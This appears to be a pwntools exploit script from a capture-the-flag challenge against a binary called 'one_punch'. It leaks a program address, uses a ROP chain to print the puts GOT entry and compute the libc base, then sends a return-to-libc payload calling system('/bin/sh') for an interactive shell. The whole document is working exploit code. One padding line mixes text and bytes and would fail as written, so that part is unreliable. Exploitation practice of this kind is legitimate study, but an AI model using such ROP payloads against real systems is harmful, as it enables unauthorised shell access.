#!/usr/bin/python3

from pwn import *

exe = ELF('one_punch_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*vuln+66
                b*main+20
                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
p.recvuntil(b"cape! ")
exe_leak = int(p.recvline(keepends=False), 16)
info("exe leak: " + hex(exe_leak))
exe.address = exe_leak-0x1291
info("exe base: " + hex(exe.address))


offset = "".ljust(120, b"d")
pop_rdi = exe.address + 0x0000000000001291
ret = exe.address + 0x000000000000101a
# # mapped_region
# rw_section = exe.address + 0x5a00
# set_rbp = rw_section + 0x70
payload = offset
payload += flat(
    ret,
    pop_rdi,
    exe.got['puts'],
    exe.plt['puts'],

#     pop_rdi,
#     rw_section,
#     exe.plt['gets'],
    exe.sym["main"]+20


)
sla(b"hero?\n", payload)
libc_leak = u64(p.recvline(keepends=False) + b"\0\0")
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x80ed0
info("libc base: " + hex(libc.address))

payload = b"".ljust(120) + flat(
        ret,
        pop_rdi, next(libc.search(b"/bin/sh")),
        libc.sym['system']
)
sl(payload)


p.interactive()
